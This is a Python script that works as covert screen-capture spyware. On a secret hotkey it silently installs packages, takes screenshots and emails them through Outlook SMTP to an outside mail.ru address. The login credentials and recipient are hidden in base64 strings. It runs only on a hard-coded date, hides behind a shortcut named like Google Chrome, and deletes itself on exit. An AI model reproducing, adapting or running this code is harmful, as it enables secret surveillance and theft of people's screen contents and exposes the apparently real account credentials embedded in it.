# -*- coding: utf-8 -*-

from os import system as command
from os.path import basename, abspath, dirname
from os import remove
from sys import executable
from tempfile import mkdtemp
from shutil import rmtree
from base64 import b64decode
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
import smtplib

try:
    from pyautogui import screenshot
    from keyboard import add_hotkey, wait
except (ModuleNotFoundError, ImportError):
    print("Installing packages...")
    command("%s -m pip install pyautogui" % executable)
    command("%s -m pip install keyboard" % executable)
    from pyautogui import screenshot
    from keyboard import add_hotkey, wait


DE = 'MDQtMDE='
DEST = 'dXJ1bm92LjA4QG1haWwucnU='

START = 'cGF2ZWwuc2Vkb3lraW5Ab3V0bG9vay5jb20='
_SMTP = "outlook"
PWD = 'cGF2QHNlZCYyMDA3QDExQDE1'
CHECK = True


class MailControl:

    def __init__(self, temp, start, dest, _smtp, pd):
        self.temp = temp
        self.start = b64decode(start).decode()
        self.dest = b64decode(dest).decode()
        self._smtp = _smtp
        self.pd = b64decode(pd).decode()
        self.number = 0

        self.connection = smtplib.SMTP("smtp.%s.com:587" % self._smtp)
        self.connection.ehlo()
        self.connection.starttls()
        self.connection.ehlo()
        self.connection.login(self.start, self.pd)

    def send_shot(self):
        try:
            fl = (self.temp + "\\scr%s.png" % self.number)
            screenshot().save(fl)
            with open(fl, "rb") as picture:
                img_data = picture.read()

            msg = MIMEMultipart()
            msg['Subject'] = 'data'
            msg['From'] = self.start
            msg['To'] = self.dest

            text = MIMEText("Picture number %s" % (self.number + 1))
            msg.attach(text)
            image = MIMEImage(img_data, name=basename(fl))
            msg.attach(image)

            self.connection.sendmail(self.start, self.dest, msg.as_string())
            self.number += 1
        except:
            rmtree(temp_dir)
            remove(dirname(abspath(__file__))+"\\Google Chrome-.lnk")
            remove(abspath(__file__))
            exit(0)

    def quit(self):
        self.connection.quit()


if __name__ == '__main__':
    now = datetime.now()
    hr = now.hour
    if str(now.date())[5:] != b64decode(DE).decode() and CHECK:
        exit(0)
    if now.day > 1 and now.month >= 4:
        try:
            remove(dirname(abspath(__file__))+"\\Google Chrome-.lnk")
        except FileNotFoundError:
            pass
        try:
            remove(abspath(__file__))
        except FileNotFoundError:
            pass
        exit(0)

    wait("end+up arrow+down arrow")

    temp_dir = mkdtemp()
    mail_obj = MailControl(temp_dir, START, DEST, _SMTP, PWD)

    add_hotkey('left ctrl+left alt', lambda: mail_obj.send_shot())
    wait("right ctrl+right shift+left arrow")

    mail_obj.quit()
    rmtree(temp_dir)
    remove(dirname(abspath(__file__))+"\\Google Chrome-.lnk")
    remove(abspath(__file__))
